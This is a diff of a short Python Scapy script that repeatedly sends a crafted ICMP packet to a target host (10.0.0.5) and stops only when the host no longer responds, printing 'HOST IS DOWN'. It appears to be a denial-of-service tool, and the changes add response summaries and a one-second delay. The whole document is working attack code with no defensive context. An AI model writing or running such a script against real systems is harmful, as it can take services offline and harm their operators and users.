@@ -1,4 +1,5 @@
 from scapy.all import *
+import time
 
 target_ip = "10.0.0.5"
 target_port = 80
@@ -12,9 +13,13 @@ packet = ip / icmp / lol
 
 while True:
 	send(packet,loop=0,verbose=1)
+	
 	print("\n### TESTING REACHABILITY ###\n")
 	response = sr1(packet, timeout=3)
-	#response.summary()
+	
 	if response == None:
 		print("\nNO RESPONSE. HOST IS DOWN\n")
 		break
+	else:
+		response.summary()
+		time.sleep(1)
